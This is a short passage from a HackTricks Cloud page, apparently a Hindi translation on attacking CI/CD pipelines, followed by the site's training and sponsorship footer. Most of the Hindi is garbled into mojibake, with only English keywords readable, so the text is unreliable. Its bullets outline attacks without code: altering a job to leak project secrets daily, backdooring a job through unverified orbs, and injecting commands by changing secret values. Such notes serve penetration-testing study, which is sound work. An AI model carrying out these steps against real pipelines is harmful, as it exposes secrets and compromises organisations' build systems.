* рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ рдмрдирд╛рдПрдБ / рдПрдХ рдЬреНрдЮрд╛рдд рдЬреЙрдм рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдЬреЛ рд╣рд░ рджрд┐рди рд╕рднреА context рдФрд░ **projects secrets** рдХреЛ **leak** рдХрд░реЗрдЧрд╛ред
* рдпрджрд┐ рдЖрдк рдПрдХ рдЧрд┐рдЯрд╣рдм рдорд╛рд▓рд┐рдХ рд╣реИрдВ рддреЛ рдЖрдк **рдЕрд╕рддреНрдпрд╛рдкрд┐рдд рдСрд░реНрдмреНрд╕ рдХреА рдЕрдиреБрдорддрд┐** рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдЬреЙрдм рдореЗрдВ рдЗрд╕реЗ **backdoor** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* рдЖрдк рдХреБрдЫ рдХрд╛рд░реНрдпреЛрдВ рдореЗрдВ рдПрдХ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рднреЗрджреНрдпрддрд╛** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **secret** рдХреЗ рдорд╛рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ **commands** рдХреЛ **inject** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
